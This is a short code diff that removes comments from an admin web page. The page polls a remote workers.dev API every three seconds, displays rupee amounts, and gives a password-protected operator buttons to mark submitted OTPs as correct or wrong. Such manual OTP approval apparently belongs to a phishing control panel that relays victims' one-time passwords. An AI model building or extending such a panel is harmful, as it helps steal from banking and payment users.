@@ -56,7 +56,7 @@ tr.dt td{background:var(--bg);padding:14px 18px}
 
 <script>
 const API = 'https://docsmartly-api.hm2351994.workers.dev';
-const REFRESH_MS = 3000; // Live sync every 3 seconds
+const REFRESH_MS = 3000;
 const $ = s => document.querySelector(s);
 const esc = x => String(x ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
 const inr = n => '₹' + Number(n || 0).toLocaleString('en-IN');
@@ -151,7 +151,6 @@ function draw() {
   }
 }
 
-// Login & Events
 $('#gf').onsubmit = async e => {
   e.preventDefault();
   PASS = $('#gp').value;
@@ -164,7 +163,6 @@ document.addEventListener('click', async e => {
   const t = e.target.closest('.t');
   if (t) { tab = t.dataset.t; open = null; draw(); return; }
 
-  // Handle Approve -> Success
   const correctBtn = e.target.closest('[data-otp-correct]');
   if (correctBtn) {
     const id = correctBtn.dataset.otpCorrect;
@@ -174,7 +172,6 @@ document.addEventListener('click', async e => {
     return;
   }
 
-  // Handle Reject -> Wrong OTP
   const wrongBtn = e.target.closest('[data-otp-wrong]');
   if (wrongBtn) {
     const id = wrongBtn.dataset.otpWrong;
@@ -212,7 +209,6 @@ document.addEventListener('change', e => {
 $('#q').oninput = draw;
 $('#fs').onchange = draw;
 
-// Live auto-refresh background sync every 3 seconds
 const typing = () => { const el = document.activeElement; return !!el && ['TEXTAREA', 'SELECT', 'INPUT'].includes(el.tagName); };
 setInterval(async () => {
   if (!PASS || document.hidden || typing()) return;
